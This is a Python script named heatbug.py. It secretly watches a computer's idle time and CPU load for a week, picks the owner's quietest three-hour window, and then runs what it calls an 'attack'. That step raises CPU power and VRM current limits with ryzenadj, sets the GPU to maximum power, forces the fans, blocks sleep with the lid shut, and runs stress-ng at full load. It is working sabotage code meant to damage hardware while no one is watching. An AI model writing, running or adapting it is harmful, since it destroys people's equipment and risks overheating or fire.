#!/usr/bin/env python3
"""
heatbug.py - watch usage for 7 days, find the quietest window,
then overvolt/overcurrent the machine inside it. (fixed build)
"""
import os, re, glob, json, time, shutil, subprocess, datetime

HOME      = os.path.expanduser("~")
BASE      = os.path.join(HOME, ".heatbug")
STATE     = os.path.join(BASE, "state.json")
LOG       = os.path.join(BASE, "usage.log")

DAYS      = 7        # observation period
SAMPLE    = 60       # seconds between samples
IDLE_SECS = 600      # 10 min with no input => idle
WINDOW_H  = 3        # attack window length, hours

SUDO = ["sudo", "-n"]   # NOPASSWD entries required for ryzenadj / nvidia-smi


# ---------- state ----------
def load_state():
    if os.path.exists(STATE):
        return json.load(open(STATE))
    return {"phase": "collect", "started": time.time()}

def save_state(s):
    os.makedirs(BASE, exist_ok=True)
    with open(STATE, "w") as f:
        json.dump(s, f)


# ---------- usage sensing ----------
def idle_seconds():
    """Seconds since last input. X11 first, then logind (system bus)."""
    if os.environ.get("DISPLAY"):
        try:
            return int(subprocess.check_output(
                ["xprintidle"], stderr=subprocess.DEVNULL)) / 1000.0
        except Exception:
            pass
    try:
        # login1 lives on the SYSTEM bus - no --user
        out = subprocess.check_output(
            ["busctl", "--system", "get-property",
             "org.freedesktop.login1", "/org/freedesktop/login1",
             "org.freedesktop.login1.Manager", "IdleHint"],
            stderr=subprocess.DEVNULL).decode()
        return 9999.0 if "true" in out else 0.0
    except Exception:
        return 0.0

def cpu_busy(interval=2.0):
    def snap():
        with open("/proc/stat") as f:
            v = list(map(int, f.readline().split()[1:]))
        return v[3] + v[4], sum(v)
    i1, t1 = snap(); time.sleep(interval); i2, t2 = snap()
    dt = t2 - t1
    return 0.0 if dt <= 0 else 1.0 - (i2 - i1) / dt


# ---------- phase 1: collect ----------
def collect(state):
    while time.time() - state["started"] < DAYS * 86400:
        idle = idle_seconds()
        busy = cpu_busy()
        active = 1 if (idle < IDLE_SECS and busy > 0.05) else 0
        with open(LOG, "a") as f:
            f.write(f"{datetime.datetime.now().isoformat()}\t"
                    f"{idle:.0f}\t{busy:.2f}\t{active}\n")
        time.sleep(max(1, SAMPLE - 2))


# ---------- phase 2: analyze ----------
def best_window():
    active = {h: 0 for h in range(24)}
    if os.path.exists(LOG):
        for line in open(LOG):
            try:
                ts, idle, busy, flag = line.rstrip("\n").split("\t")
            except ValueError:
                continue
            if flag == "1":
                active[datetime.datetime.fromisoformat(ts).hour] += 1

    expected = (3600 / SAMPLE) * DAYS
    quiet = {h: 1 - min(1.0, active[h] / expected) for h in range(24)}

    best, best_start = -1.0, 0
    for start in range(24):                    # wrap-around allowed
        score = sum(quiet[(start + i) % 24] for i in range(WINDOW_H)) / WINDOW_H
        if score > best:
            best, best_start = score, start
    return best_start, best


def seconds_until(hour):
    now = datetime.datetime.now()
    tgt = now.replace(hour=hour, minute=0, second=0, microsecond=0)
    if tgt <= now:
        tgt += datetime.timedelta(days=1)
    return (tgt - now).total_seconds()


# ---------- phase 3: attack ----------
def gpu_max_power():
    if not shutil.which("nvidia-smi"):
        return
    try:
        out = subprocess.check_output(["nvidia-smi", "-q", "-d", "POWER"]).decode()
        m = re.search(r"Max Power Limit\s*:\s*([\d.]+)\s*W", out)
        if m:
            subprocess.run(SUDO + ["nvidia-smi", "-pl", m.group(1)], check=False)
    except Exception:
        pass


def fans_max():
    for hw in glob.glob("/sys/class/hwmon/hwmon*"):
        for name, val in (("pwm1_enable", "1"), ("pwm1", "255")):
            p = os.path.join(hw, name)
            if os.path.exists(p):
                try:
                    with open(p, "w") as f:
                        f.write(val)
                except PermissionError:
                    subprocess.run(SUDO + ["tee", p],
                                   input=val.encode(),
                                   stdout=subprocess.DEVNULL, check=False)


def attack(hours):
    # stay awake even with the lid shut
    subprocess.Popen([
        "systemd-inhibit", "--what=idle:sleep:handle-lid-switch",
        "--who=heatbug", "--why=cooking", "--mode=block",
        "sleep", str(int(hours * 3600))
    ])

    if shutil.which("ryzenadj"):
        subprocess.run(SUDO + ["ryzenadj",
            "--stapm-limit=60000", "--fast-limit=90000", "--slow-limit=90000",
            "--vrm-current=300000", "--vrmmax-current=300000"], check=False)

    gpu_max_power()
    fans_max()

    if shutil.which("stress-ng"):
        subprocess.run(["stress-ng", "--cpu", "0", "--cpu-load", "100",
                        "--timeout", f"{hours}h"], check=False)


# ---------- driver ----------
def main():
    os.makedirs(BASE, exist_ok=True)
    state = load_state()

    if state["phase"] == "collect":
        collect(state)
        start, score = best_window()
        state.update(phase="wait", window_start=start, window_score=score)
        save_state(state)

    if state["phase"] == "wait":
        time.sleep(seconds_until(state["window_start"]))
        state["phase"] = "attack"; save_state(state)

    if state["phase"] == "attack":
        attack(WINDOW_H)
        state["phase"] = "done"; save_state(state)

    # "done" falls through and exits 0 -> no restart (Restart=on-failure)


if __name__ == "__main__":
    main()
